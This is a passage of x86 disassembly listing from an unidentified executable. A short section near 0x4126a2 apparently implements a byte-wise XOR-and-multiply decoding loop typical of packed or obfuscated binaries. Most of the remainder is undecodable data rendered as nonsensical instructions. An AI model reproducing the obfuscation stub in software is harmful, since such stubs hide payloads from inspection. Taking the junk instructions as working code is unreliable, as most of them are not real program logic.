  412665:	pop    ebx
  412666:	call   DWORD PTR [ecx-0x2c]
  412669:	and    DWORD PTR [ebx],0xffffff86
  41266c:	xor    al,cl
  41266e:	outs   dx,BYTE PTR ds:[esi]
  41266f:	fild   WORD PTR [ebx-0x69]
  412672:	fistp  QWORD PTR [ebx]
  412674:	and    BYTE PTR [edx-0x66012655],bl
  41267a:	(bad)  
  41267b:	inc    esp
  41267c:	cwde   
  41267d:	ja     0x41260f
  41267f:	and    ch,cl
  412681:	ins    DWORD PTR es:[edi],dx
  412682:	jmp    0x84e5:0x98fee10a
  412689:	addr16 (bad) 
  41268b:	int3   
  41268c:	adc    esp,DWORD PTR [ebx+0x12]
  41268f:	xor    edi,DWORD PTR fs:[eax]
  412692:	test   eax,0x541a972a
  412697:	mov    edx,?
  412699:	jg     0x41270c
  41269b:	pop    es
  41269c:	jne    0x4126b8
  4126a2:	xor    eax,esi
  4126a4:	add    eax,edi
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0xaf
  412711:	dec    BYTE PTR [edx+0x626a4788]
  412717:	bound  ecx,QWORD PTR [edx]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx+0x5]
  41271d:	mov    BYTE PTR [ebx-0xea6a0bf],0xa0
  412724:	mov    al,0xbb
  412726:	sbb    al,0x7a
  412728:	cmc    
  412729:	xor    edx,DWORD PTR [ebx]
  41272b:	or     eax,0x27a2ac18
  412730:	adc    eax,0xac33f4cf
  412735:	mov    ebx,0xb8d0d8d1
  41273a:	xchg   BYTE PTR [ecx],bl
  41273c:	fisubr WORD PTR [esp+edi*1]
  41273f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412740:	les    esi,FWORD PTR [ebx-0xc30005d]
  412746:	mov    esi,0x9424c8a3
  41274b:	out    dx,eax
  41274c:	aad    0xcd
  41274e:	ret    0xa9fa
  412751:	fs xchg esp,eax
  412753:	pop    esp
  412754:	fs add al,0xb0
  412757:	loop   0x41278b
  412759:	dec    ebx
  41275a:	in     eax,dx
  41275b:	push   0xffffffcb
  41275d:	bound  esp,QWORD PTR [edx-0x6e]
  412760:	sub    ch,bl
  412762:	cmp    DWORD PTR [ebp+0x9],ebp
  412765:	in     eax,0x23
  412767:	pop    ds
  412768:	bound  esp,QWORD PTR [ecx]
  41276a:	mov    cl,0x3f
  41276c:	shr    DWORD PTR [esi+0x4a498424],1
  412772:	xchg   DWORD PTR [edi-0x1f],esi
  412775:	(bad)  
  412776:	fbstp  TBYTE PTR [esi]
  412778:	hlt    
  412779:	lods   al,BYTE PTR ds:[esi]
  41277a:	add    DWORD PTR [edi-0x3449447c],ebp
  412780:	ss xor ebp,edx
  412783:	scas   al,BYTE PTR es:[edi]
  412784:	retf   
  412785:	mov    al,ds:0xee1c6e5f
  41278a:	ds cwde 
  41278c:	(bad)  
  41278d:	call   0x4bef31ef
  412792:	fcomp  QWORD PTR [ecx-0x13]
  412795:	adc    BYTE PTR [ecx-0x2c025c7f],0xdf
  41279c:	cdq    
  41279d:	dec    ebx
  41279e:	push   ds
  41279f:	inc    ebp
  4127a0:	jne    0x4127f2
  4127a2:	jg     0x412766
  4127a4:	rol    dl,1
  4127a6:	mov    edi,0x2424b74d
  4127ab:	jne    0x412813
  4127ad:	mov    ebx,0xa3af8b2b
  4127b2:	jns    0x412818
  4127b4:	jns    0x41274c
  4127b6:	mov    ecx,0xc1daed51
  4127bb:	cmp    al,BYTE PTR [edi+0x64ac46f3]
  4127c1:	mov    bl,0xdb
  4127c3:	fisttp DWORD PTR [esi+0x533d922c]
  4127c9:	ja     0x412759
  4127cb:	jp     0x41282e
  4127cd:	and    dh,ch
  4127cf:	and    DWORD PTR [ebp-0x5a],ebp
  4127d2:	mov    al,0xb6
  4127d4:	pop    ecx
  4127d5:	xchg   edi,eax
  4127d6:	adc    BYTE PTR [eax+ecx*8+0x46375a68],bh
  4127dd:	xchg   edx,eax
  4127de:	aad    0xa3
  4127e0:	sub    cl,BYTE PTR [ebx+ebx*1]
  4127e3:	out    dx,al
  4127e4:	(bad)
  4127e7:	dec    esp
  4127e8:	stos   BYTE PTR es:[edi],al
  4127e9:	adc    BYTE PTR [eax],cl
  4127eb:	xchg   edx,eax
  4127ec:	int    0xdd
  4127ee:	or     eax,0xccb80b49
  4127f3:	cmp    DWORD PTR [esi-0x4f8c6e6],0xffffffe3
  4127fa:	shl    ah,cl
  4127fc:	cmp    ch,BYTE PTR [esi]
  4127fe:	pusha  
  4127ff:	cmp    BYTE PTR [ebp-0x12],0xfe
  412803:	dec    edi
  412804:	inc    ecx
  412805:	xchg   esp,eax
  412806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412807:	pop    edx
  412808:	jge    0x412855
  41280a:	mov    edx,0x827f95fa
  41280f:	xchg   esi,eax
  412810:	push   edx
  412811:	cmp    al,0x40
  412813:	sahf   
  412814:	pop    ebp
  412815:	fst    QWORD PTR [edx]
  412817:	ins    BYTE PTR es:[edi],dx
  412818:	and    DWORD PTR [ebp+0x38],ebp
  41281b:	inc    esi
  41281c:	jne    0x4127ac
  41281e:	xor    DWORD PTR [ebx+0x1c30aeda],ecx
  412824:	cmp    al,0xf1
  412826:	int    0x41
  412828:	mov    ebp,0xfa4d3dbc
  41282d:	sahf   
  41282e:	ret    0x350c
  412831:	dec    esi
  412832:	mov    edi,0x52b84b7c
  412837:	popa   
  412838:	push   ecx
  412839:	lea    esp,[ebx]
  41283b:	inc    esp
  41283c:	jno    0x4128b0
  41283e:	(bad)  
  412840:	xchg   ch,dl
  412842:	ja     0x41280a
  412844:	dec    ecx
  412845:	popa   
  412846:	mov    bl,0x49
  412848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412849:	mov    edx,0x8ebcbf0d
  41284e:	xlat   BYTE PTR ds:[ebx]
  41284f:	inc    ebx
  412850:	repz lock rcl bh,1
  412854:	inc    ebx
  412855:	xor    bl,BYTE PTR [eax]
  412857:	dec    esp
  412858:	adc    edi,esi
  41285a:	xchg   ebp,eax
  41285b:	inc    esp
  41285c:	push   ss
  41285d:	dec    ebp
  41285e:	nop
  41285f:	pop    edx
  412860:	out    dx,al
  412861:	push   esi
  412862:	mov    dl,0xe7
  412864:	push   cs
  412865:	jl     0x4128bf
  412867:	xor    al,0xe
  412869:	and    DWORD PTR [edx],0xc24a1e09
  41286f:	pop    edx
  412870:	jmp    0x4128b2
  412872:	inc    esp
  412873:	idiv   DWORD PTR [ebp+esi*8+0x30109a0f]
  41287a:	add    BYTE PTR [bp+si-0x1bf9],bl
  41287f:	out    0x55,al
  412881:	jge    0x412899
  412883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412885:	mov    bl,bl
  412887:	test   eax,0xd57676c9
  41288c:	into   
  41288d:	and    al,0x7b
  41288f:	nop
  412890:	imul   edi,DWORD PTR [esi+0x6d6a9eae],0x60
  412897:	jmp    0x396f:0x55c82984
  41289e:	sub    eax,0xec20b2e3
  4128a3:	addr16 retf 0x990c
  4128a7:	xor    cl,BYTE PTR ds:0x6d437157
  4128ad:	sti    
  4128ae:	mov    esi,eax
  4128b0:	add    DWORD PTR [esi+eiz*2],esi
  4128b3:	mov    dh,0x88
  4128b5:	and    edi,DWORD PTR [eax+0x54836a63]
  4128bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128bc:	clc    
  4128bd:	mov    cl,0xc3
  4128bf:	loop   0x4128ba
  4128c1:	xchg   DWORD PTR [ecx+ecx*8],ecx
  4128c4:	imul   ecx,DWORD PTR [edi-0x6a],0xfffffff7
  4128c8:	imul   ebp,edi,0x2bc6f4ce
  4128ce:	push   edx
  4128cf:	arpl   WORD PTR [esp+eax*4-0x24bb357f],cx
  4128d6:	neg    DWORD PTR [esi+0x6e]
  4128d9:	in     eax,dx
  4128da:	fmul   QWORD PTR [eax]
  4128dc:	xchg   esi,eax
  4128dd:	xor    ecx,DWORD PTR [eax+esi*1-0x9]
  4128e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e2:	pop    eax
  4128e3:	cmp    ebp,ecx
  4128e5:	pop    edi
  4128e6:	and    al,0x1
  4128e8:	jb     0x41294a
  4128ea:	mov    ah,0x5b
  4128ec:	pushf  
  4128ed:	jle    0x412931
  4128ef:	xchg   edx,eax
  4128f0:	ret    
  4128f1:	jno    0x412971
  4128f3:	pop    eax
  4128f4:	dec    ecx
  4128f5:	jg     0x4128ac
  4128f7:	fcomip st,st(0)
  4128f9:	pop    eax
  4128fa:	mov    esp,0xe8f760d8
  4128ff:	jge    0x412908
  412901:	cmc    
  412902:	fs retf 
  412904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412905:	outs   dx,DWORD PTR ds:[esi]
  412906:	loopne 0x412890
  412908:	mov    eax,ds:0x6dd0e920
  41290d:	cmp    al,0xa5
  41290f:	call   0x656f:0x2d240326
  412916:	popa   
  412917:	mov    esp,0x53602c52
  41291c:	rcl    DWORD PTR [edx],0xcd
  41291f:	jmp    0xf4e1:0xe6094a8c
  412926:	inc    eax
  412927:	lea    esp,ds:0x73e72fcb
  41292d:	push   0x5f
  41292f:	cs mov ecx,0x35547786
  412935:	push   eax
  412936:	enter  0x315b,0x25
  41293a:	test   eax,0xa9fae3e3
  41293f:	inc    edi
  412940:	gs rol al,cl
  412943:	lock jge 0x4129be
  412946:	fdivr  DWORD PTR [edx-0x7f]
  412949:	push   eax
  41294a:	dec    ebx
  41294b:	sub    BYTE PTR [ebp+0x7f9ec9ff],cl
  412951:	mov    WORD PTR [esi-0x30],ss
  412954:	test   BYTE PTR [edi-0x9],dl
  412957:	xchg   ecx,eax
  412958:	sahf   
  412959:	push   ebp
  41295a:	test   eax,0xa09fcf79
  41295f:	adc    BYTE PTR [ebx],0xc6
  412962:	mov    ebx,0xdd4602a5
  412967:	or     al,0x50
  412969:	pop    eax
  41296a:	repz imul ecx,ecx,0x14
  41296e:	sub    eax,0x1e77831f
  412973:	xor    bh,BYTE PTR [eax-0x78]
  412976:	outs   dx,DWORD PTR ds:[esi]
  412977:	jne    0x412918
  412979:	fs fwait
  41297b:	lahf   
  41297c:	loopne 0x4129e0
  41297e:	into   
  41297f:	mov    dl,0x8
  412981:	sub    ebp,DWORD PTR [ecx]
  412983:	dec    edi
  412984:	loop   0x4129d2
  412986:	test   dl,dl
  412988:	inc    ebx
  412989:	ins    BYTE PTR es:[edi],dx
  41298a:	std    
  41298b:	mov    ss,ebp
  41298d:	aam    0x25
  41298f:	dec    edi
  412990:	jecxz  0x4129d3
  412992:	cs ds retf 
  412995:	gs and eax,0xaf44514c
  41299b:	inc    edx
  41299c:	inc    esi
  41299d:	test   eax,0xb42a7f3a
  4129a2:	nop
  4129a3:	sbb    al,0xe
  4129a5:	mov    edi,fs
  4129a7:	jmp    0x8c2d:0x6f6d7ca9
  4129ae:	xor    esp,DWORD PTR [edi]
  4129b0:	lods   eax,DWORD PTR ds:[esi]
  4129b1:	pop    ds
  4129b2:	ret    
  4129b3:	cmp    eax,0x6fc10d85
  4129b8:	ja     0x4129bb
  4129ba:	xchg   ecx,eax
  4129bb:	lods   eax,DWORD PTR ds:[esi]
  4129bc:	add    DWORD PTR ds:0xa1a119d8,0xfffffff1
  4129c3:	pushf  
  4129c4:	pop    es
  4129c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c6:	pop    esp
  4129c7:	fidiv  WORD PTR [esp+edx*2-0x4c780b84]
  4129ce:	stos   BYTE PTR es:[edi],al
  4129cf:	rol    dh,0x6e
  4129d2:	adc    eax,0x5bf93163
  4129d7:	mov    ecx,0x8a27f4b8
  4129dc:	pop    ds
  4129dd:	push   esi
  4129de:	mov    dh,0x25
  4129e0:	adc    al,0xf5
  4129e2:	cmp    BYTE PTR [edx+ecx*2+0x56],bh
  4129e6:	xchg   ebx,eax
  4129e7:	bnd js 0x412a0c
  4129ea:	add    edi,DWORD PTR [ebx+ebx*1]
  4129ed:	dec    ebx
  4129ee:	cld    
  4129ef:	fiadd  WORD PTR [edx]
  4129f1:	mov    bh,0xed
  4129f3:	xchg   ebx,eax
  4129f4:	add    al,0xae
  4129f6:	ror    edx,1
  4129f8:	aad    0x6a
  4129fa:	pusha  
  4129fb:	leave  
  4129fc:	adc    ebx,DWORD PTR [eax]
  4129fe:	lods   eax,DWORD PTR ds:[esi]
  4129ff:	jg     0x412a02
  412a01:	push   ecx
  412a02:	lds    ecx,FWORD PTR [edx*4-0x7eb5143b]
  412a09:	push   cs
  412a0a:	sbb    ebp,edi
  412a0c:	aaa    
  412a0d:	shl    BYTE PTR [ebp+0x29],0x48
  412a11:	loopne 0x4129d3
  412a13:	pushf  
  412a14:	cmp    al,bl
  412a16:	inc    edx
  412a17:	gs inc edi
  412a19:	cmp    ch,BYTE PTR [edx]
  412a1b:	sbb    eax,0xd8e85a2a
  412a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a21:	inc    esi
  412a22:	fisttp DWORD PTR [edi-0x2e275b02]
  412a28:	mov    ah,0xf7
  412a2a:	xchg   ecx,eax
  412a2b:	test   BYTE PTR [edx+edx*8+0x42d6b347],ch
  412a32:	lea    esi,[eax+0x35]
  412a35:	int    0x20
  412a37:	dec    ecx
  412a38:	icebp  
  412a39:	and    DWORD PTR [eax-0x8],esi
  412a3c:	add    BYTE PTR [edx-0x51],0xa3
  412a40:	and    edx,DWORD PTR [ebx-0x777b2281]
  412a46:	ins    BYTE PTR es:[edi],dx
  412a47:	test   DWORD PTR [edi-0x2],ebp
  412a4a:	fwait
  412a4b:	shl    BYTE PTR [edx-0x4f8e9f94],0x9f
  412a52:	not    BYTE PTR [eax-0x749f3237]
  412a58:	sahf   
  412a59:	mov    cl,BYTE PTR [ebx+0x395bfe63]
  412a5f:	push   ss
  412a60:	(bad)  
  412a61:	into   
  412a62:	test   BYTE PTR [esi+0x2a900f6a],dl
  412a68:	push   cs
  412a69:	out    dx,eax
  412a6a:	mov    ds:0xf183eaf6,eax
  412a6f:	mov    bh,0x21
  412a71:	lods   eax,DWORD PTR ds:[esi]
  412a72:	in     al,dx
  412a73:	fbld   TBYTE PTR [edi-0x245f13db]
  412a79:	jo     0x412a48
  412a7b:	fsub   DWORD PTR [ecx+ecx*1-0x24]
  412a7f:	loop   0x412ae8
  412a81:	scas   al,BYTE PTR es:[edi]
  412a82:	jae    0x412af8
  412a84:	cmp    dh,dh
  412a86:	pop    eax
  412a87:	out    0xd0,eax
  412a89:	pop    ss
  412a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a8b:	fcmove st,st(7)
  412a8d:	and    eax,0x8a736167
  412a92:	mov    esp,DWORD PTR ds:0xf667ff32
  412a98:	ror    edi,0x2a
  412a9b:	cmp    eax,0x85bda7a8
  412aa0:	out    dx,al
  412aa1:	les    ebx,FWORD PTR [eax]
  412aa3:	xor    DWORD PTR [ecx+esi*4],esp
  412aa6:	dec    edi
  412aa7:	cwde   
  412aa8:	xchg   esp,eax
  412aa9:	mov    edi,0xcf31965e
  412aae:	fdiv   st,st(0)
  412ab0:	scas   al,BYTE PTR es:[edi]
  412ab1:	xchg   edi,eax
  412ab2:	mov    ah,0x26
  412ab4:	sti    
  412ab5:	and    DWORD PTR [ecx+ebx*8-0x6f16d02e],0x3b0e5a20
  412ac0:	fmul   st,st(0)
  412ac2:	mov    bl,0x54
  412ac4:	xor    DWORD PTR [esi],esp
  412ac6:	outs   dx,DWORD PTR ds:[esi]
  412ac7:	push   esp
  412ac8:	mov    ebx,0x6a538afd
  412acd:	sbb    ebp,DWORD PTR cs:[edx-0x48]
  412ad1:	cld    
  412ad2:	mov    dl,BYTE PTR [edx+edi*4+0x6e4813c0]
  412ad9:	push   esp
  412ada:	xchg   esp,eax
  412adb:	ret    0x898d
  412ade:	sbb    BYTE PTR [edx-0x5383208a],al
  412ae4:	mov    ecx,DWORD PTR [eax+0x2a]
  412ae7:	jecxz  0x412af9
  412ae9:	mov    ah,0xf3
  412aeb:	jp     0x412a9c
  412aed:	(bad)  
  412aee:	out    dx,eax
  412aef:	stos   BYTE PTR es:[edi],al
  412af0:	imul   esi,esp,0xffffffc7
  412af3:	popa   
  412af4:	(bad)  
  412af5:	pusha  
  412af6:	mov    ecx,0xf89968ff
  412afb:	add    eax,0xb337d957
  412b00:	sahf   
  412b01:	cmc    
  412b02:	dec    esi
  412b03:	xor    al,0xf0
  412b05:	fiadd  WORD PTR [esi]
  412b07:	mov    ebp,0x7a1c2235
  412b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0d:	or     ebx,DWORD PTR [edi+0x3cb28691]
  412b13:	sub    al,0x65
  412b15:	jecxz  0x412aa2
  412b17:	js     0x412b7e
  412b19:	(bad)  
  412b1a:	push   edi
  412b1b:	dec    edi
  412b1c:	push   ebx
  412b1d:	dec    esi
  412b1e:	stc    
  412b1f:	js     0x412b29
  412b21:	jecxz  0x412b10
  412b23:	stos   BYTE PTR es:[edi],al
  412b24:	mov    ch,0x2b
  412b26:	cmp    esi,DWORD PTR es:0x3bb22708
  412b2d:	dec    esi
  412b2e:	jge    0x412b14
  412b30:	or     eax,0x65a4bace
  412b35:	jnp    0x412ba7
  412b37:	mov    esp,0xa34bffe4
  412b3c:	mov    edx,0x273638d
  412b41:	cdq    
  412b42:	je     0x412b2c
  412b44:	and    BYTE PTR [edi],bl
  412b46:	adc    bh,BYTE PTR cs:[esi]
  412b49:	mov    edx,ebp
  412b4b:	es sahf 
  412b4d:	mov    bh,0xc4
  412b4f:	xchg   ebx,esp
  412b51:	dec    ebx
  412b52:	add    bh,bl
  412b54:	std    
  412b55:	out    dx,eax
  412b56:	jno    0x412b5b
  412b58:	jecxz  0x412b4d
  412b5a:	mov    ds:0xb938f0f9,eax
  412b5f:	xlat   BYTE PTR ds:[ebx]
  412b60:	shl    BYTE PTR [edi-0x1893a917],0xc7
  412b67:	push   cs
  412b68:	(bad)  
  412b69:	iret   
  412b6a:	sar    DWORD PTR [ebx],1
  412b6c:	add    DWORD PTR [ebp+0x60],ebp
  412b6f:	adc    DWORD PTR [ebp+0x77],ebx
  412b72:	mov    al,ds:0x5d140a8e
  412b77:	iret   
  412b78:	jg     0x412bbb
  412b7a:	test   al,0x88
  412b7c:	jp     0x412b64
  412b7e:	adc    al,BYTE PTR [edx-0x32f29672]
  412b84:	out    0x74,al
  412b86:	mov    edi,0x70e84389
  412b8b:	mov    edx,0xe0157d99
  412b90:	adc    eax,0x7deaceda
  412b95:	cmp    eax,0x5943d992
  412b9a:	add    al,0xb9
  412b9c:	(bad)  
  412b9d:	sbb    eax,0xac29495f
  412ba2:	cwde   
  412ba3:	sub    ecx,ecx
  412ba5:	loop   0x412bba
  412ba7:	in     eax,0x3
  412ba9:	and    ebp,DWORD PTR ds:0xb70b6035
  412baf:	fstp   DWORD PTR [esp+edx*4+0x204dbe57]
  412bb6:	cld    
  412bb7:	cmp    bh,dh
  412bb9:	loope  0x412c37
  412bbb:	mov    dl,al
  412bbd:	push   ebx
  412bbe:	rcl    cl,0x60
  412bc1:	sub    dl,al
  412bc3:	dec    ebp
  412bc4:	push   ss
  412bc5:	xchg   esp,eax
  412bc6:	add    ebx,DWORD PTR [esi]
  412bc8:	inc    edx
  412bc9:	je     0x412c02
  412bcb:	jp     0x412bff
  412bcd:	or     bh,dl
  412bcf:	iret   
  412bd0:	adc    bl,al
  412bd2:	jge    0x412b61
  412bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd5:	push   DWORD PTR [esi-0x6cf69974]
  412bdb:	fimul  WORD PTR [edx-0xb]
  412bde:	cmp    eax,0xd5c3dc2e
  412be3:	push   eax
  412be4:	pusha  
  412be5:	pop    ds
  412be6:	popf   
  412be7:	or     eax,0xfa7e45f2
  412bec:	loopne 0x412c53
  412bee:	out    0xfa,eax
  412bf0:	out    dx,eax
  412bf1:	xchg   edi,eax
  412bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf3:	push   0xffffffeb
  412bf5:	push   0x1ce0f2c0
  412bfa:	inc    esi
  412bfb:	retf   0x8e42
  412bfe:	ror    BYTE PTR [edi+0x20],1
  412c01:	jle    0x412b8f
  412c03:	mov    ch,0x94
  412c05:	cmc    
  412c06:	gs pop ss
  412c08:	dec    ebp
  412c09:	(bad)  
  412c0a:	xchg   esi,eax
  412c0b:	ror    dl,1
  412c0d:	or     eax,0xb9811983
  412c12:	fisubr WORD PTR [ebp-0x745b1f06]
  412c18:	jp     0x412c27
  412c1a:	fld    DWORD PTR [esi-0x76]
  412c1d:	sub    al,0xa1
  412c1f:	stos   DWORD PTR es:[edi],eax
  412c20:	xchg   BYTE PTR [ecx-0xf],ah
  412c23:	inc    edi
  412c24:	(bad)  
  412c25:	mov    edi,0x56a1a316
  412c2a:	xchg   edi,eax
  412c2b:	mov    ecx,0x3bcb8635
  412c30:	jbe    0x412c53
  412c32:	push   ebx
  412c33:	ret    0xaf0
  412c36:	into   
  412c37:	mov    WORD PTR [edi],fs
  412c39:	push   ecx
  412c3a:	dec    ecx
  412c3b:	cmp    edi,0xed913c14
  412c41:	les    edi,FWORD PTR [edx]
  412c43:	push   eax
  412c44:	stc    
  412c45:	or     ch,al
  412c47:	ds dec edx
  412c49:	ret    
  412c4a:	cmp    eax,ebx
  412c4c:	pop    esp
  412c4d:	push   0x30
  412c4f:	xor    ecx,DWORD PTR [ebx-0x2e]
  412c52:	repz inc ebp
  412c54:	mov    cl,0xb8
  412c56:	jmp    0x412c55
  412c58:	pop    ss
  412c59:	mov    eax,ds:0x11c8c3e1
  412c5e:	shr    BYTE PTR [esi+0x6c6f4d3a],cl
  412c64:	out    dx,eax
  412c65:	cdq    
  412c66:	sub    bh,BYTE PTR [ebx+0xb]
  412c69:	mov    cl,0x88
  412c6b:	sub    eax,0xfc499d0c
  412c70:	mov    edx,0x3c2966b9
  412c75:	addr16 enter 0x8cf9,0xfa
  412c7a:	mov    eax,0x33e1b7fd
  412c7f:	lock leave 
  412c81:	ds cld 
  412c83:	xor    eax,0xa4319f94
  412c88:	je     0x412cc8
  412c8a:	mov    edi,0xb4423e8a
  412c8f:	ds inc eax
  412c91:	xchg   esi,eax
  412c92:	push   0x7a
  412c94:	pop    ds
  412c95:	jp     0x412c2f
  412c97:	int    0x44
  412c99:	aam    0x17
  412c9b:	nop
  412c9c:	lds    ebp,FWORD PTR [ebp-0x75]
  412c9f:	mov    dl,0x6a
  412ca1:	adc    BYTE PTR [ecx],bl
  412ca3:	cmp    ecx,DWORD PTR [edi]
  412ca5:	out    0x66,eax
  412ca7:	xor    eax,0x4da5ee9f
  412cac:	jmp    0x4f3d6a80
  412cb1:	jmp    0x1ece121a
  412cb6:	xor    ecx,esp
  412cb8:	(bad)  
  412cb9:	pop    ebx
  412cba:	arpl   WORD PTR [esi-0xb],bp
  412cbd:	add    BYTE PTR [eax-0x7fff2e8f],ah
  412cc3:	xor    eax,0x5ad7d1f2
  412cc8:	sub    edx,edx
  412cca:	test   BYTE PTR [ecx-0x9891079],0xb2
  412cd1:	xchg   edi,eax
  412cd2:	fs out 0xe4,al
  412cd5:	xor    ch,bl
  412cd7:	push   cs
  412cd8:	cmp    BYTE PTR [edx],dl
  412cda:	sub    dl,BYTE PTR [edx+0x5]
  412cdd:	test   DWORD PTR [ebx+ebx*2],ebp
  412ce0:	gs push edi
  412ce2:	cmp    edx,DWORD PTR [edx+0x6c653754]
  412ce8:	push   esp
  412ce9:	inc    esi
  412cea:	stos   BYTE PTR es:[edi],al
  412ceb:	xchg   esp,eax
  412cec:	lods   al,BYTE PTR ds:[si]
  412cee:	cmp    DWORD PTR [eax+0x63],edx
  412cf1:	test   DWORD PTR [ecx+0x4f4e1adc],ecx
  412cf7:	pop    esi
  412cf8:	push   esp
  412cf9:	jg     0x412ccc
  412cfb:	push   cs
  412cfc:	rcl    BYTE PTR [edi-0x5684cefc],cl
  412d02:	inc    edx
  412d03:	dec    ebx
  412d04:	(bad)  
  412d05:	in     eax,0x1
  412d07:	ja     0x412d28
  412d09:	mov    eax,ds:0x23cf6af0
  412d0e:	ficomp WORD PTR [eax+0x7468d82]
  412d14:	stos   BYTE PTR es:[edi],al
  412d15:	jle    0x412d5e
  412d17:	jb     0x412d90
  412d19:	cmc    
  412d1a:	popf   
  412d1b:	add    dh,BYTE PTR [edi+0x35]
  412d1e:	nop
  412d1f:	and    eax,0x44e8ae1f
  412d24:	pop    ebp
  412d25:	pop    esi
  412d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d27:	xor    DWORD PTR [edx+edi*1+0x57],0xffffffc5
  412d2c:	xchg   edi,eax
  412d2d:	mov    dl,0x70
  412d2f:	pop    ebp
  412d30:	xchg   ecx,eax
  412d31:	mov    ch,0x1c
  412d33:	sbb    BYTE PTR [eax+eax*1],cl
  412d36:	cld    
  412d37:	fsub   st(7),st
  412d39:	inc    ebx
  412d3a:	mov    DWORD PTR [ebp-0x5c81a9a0],edx
  412d40:	dec    ebx
  412d41:	push   edx
  412d42:	mov    esp,0xc2f9ad40
  412d47:	add    ebx,esp
  412d49:	push   ebx
  412d4a:	scas   eax,DWORD PTR es:[edi]
  412d4b:	std    
  412d4c:	int    0xeb
  412d4e:	mov    al,0x5d
  412d50:	ficom  WORD PTR [ebx-0x40]
  412d53:	mov    eax,es
  412d55:	lods   eax,DWORD PTR ds:[esi]
  412d56:	call   0x508726f8
  412d5b:	push   ss
  412d5c:	xchg   edi,eax
  412d5d:	loope  0x412d71
  412d5f:	push   ecx
  412d60:	sub    BYTE PTR [edx-0x594731fb],cl
  412d66:	mov    esi,0xb487d25b
  412d6b:	ror    BYTE PTR ds:0x27886259,0x5c
  412d72:	cmp    BYTE PTR [eax+0x2f756eab],dh
  412d78:	out    dx,eax
  412d79:	fst    QWORD PTR [edx-0xeeeaca0]
  412d7f:	fs xor dh,dh
  412d82:	pop    edx
  412d83:	bound  esp,QWORD PTR [edx+0x3472edde]
  412d89:	xor    BYTE PTR [edx],0x61
  412d8c:	jne    0x412dbf
  412d8e:	ins    BYTE PTR es:[edi],dx
  412d8f:	enter  0x3fab,0xb5
  412d93:	mov    cl,0x30
  412d95:	enter  0x655,0xb7
  412d99:	scas   al,BYTE PTR es:[edi]
  412d9a:	ror    DWORD PTR [edi-0x6c],cl
  412d9d:	(bad)  
  412d9e:	sti    
  412d9f:	dec    ebp
  412da0:	inc    esi
  412da1:	rol    BYTE PTR [edx+0x75e58696],cl
  412da7:	dec    ecx
  412da8:	sub    al,0xae
  412daa:	push   es
  412dab:	addr16 addr16 xor bl,al
  412daf:	jmp    0x412d8f
  412db1:	in     al,0x0
  412db3:	or     al,0x25
  412db5:	xchg   edi,eax
  412db6:	rol    ebx,cl
  412db8:	out    dx,eax
  412db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dba:	popf   
  412dbb:	fs jge 0x412e2d
  412dbe:	cli    
  412dbf:	lods   al,BYTE PTR ds:[esi]
  412dc0:	mov    al,ds:0xbc341c9
  412dc5:	dec    ebx
  412dc6:	and    BYTE PTR [eax],0xd6
  412dc9:	and    bl,0x91
  412dcc:	popf   
  412dcd:	adc    BYTE PTR [edi],ah
  412dcf:	stos   DWORD PTR es:[edi],eax
  412dd0:	mov    ds:0x57a8d4ab,eax
  412dd5:	push   es
  412dd6:	icebp  
  412dd7:	push   0xdc34ea98
  412ddc:	or     al,0xbc
  412ddf:	mov    BYTE PTR [ebx+0x63],dh
  412de2:	mov    eax,ds:0x10ba4539
  412de7:	aad    0x58
  412de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dea:	cmp    eax,0x8b0f6968
  412def:	xchg   DWORD PTR [ecx],ecx
  412df1:	mov    cl,0x5e
  412df3:	adc    BYTE PTR [ebx-0x10],dl
  412df6:	mov    edx,DWORD PTR [esi]
  412df8:	mov    ds:0x3c006e1a,eax
  412dfd:	(bad)  
  412dfe:	xchg   ecx,eax
  412dff:	cli    
  412e00:	pop    ebp
  412e01:	xlat   BYTE PTR ds:[ebx]
